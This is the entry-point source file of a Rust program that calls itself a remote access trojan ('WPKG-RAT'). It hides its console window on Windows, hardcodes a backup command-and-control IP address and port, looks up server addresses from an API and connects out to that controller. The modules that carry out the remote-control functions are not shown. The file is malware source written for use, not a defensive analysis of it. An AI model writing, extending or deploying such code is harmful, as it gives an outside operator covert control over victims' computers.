// Remove console window in Windows OS
#![windows_subsystem = "windows"]
// TODO: delete it
#![allow(dead_code)]

mod addreses;
mod client;
mod globals;
mod logger;
mod macros;
mod unwrap;
mod utils;

use std::sync::Mutex;

use lazy_static::lazy_static;
use tracing::*;

use crate::addreses::{Address, Adresses};
use crate::utils::*;

/// Server ip backup if api isn't available
pub const TCP_BACKUP_IP: &str = "136.243.156.104";
/// Server port backup if api isn't available
pub const TCP_BACKUP_PORT: u32 = 3217;

lazy_static! {
    pub static ref TCP_ADDRESS: Mutex<Vec<Address>> = Mutex::new(vec![Address::default()]);
}

#[tokio::main]
async fn main() {
    println!("WPKG-RAT {}", env!("CARGO_PKG_VERSION"));

    // get tcp server ip address from the api
    let tcp_adress = Adresses::get().await.unwrap_or_default();
    update_mutex!(TCP_ADDRESS, tcp_adress.tcp);

    // init logger
    logger::init();

    if !is_target_os()
    {
        warn!("RAT isn't runned on Windows. Some features may be unavailable. Use debug only");
    }

    // connect to the ServerD
    client::connect();
}
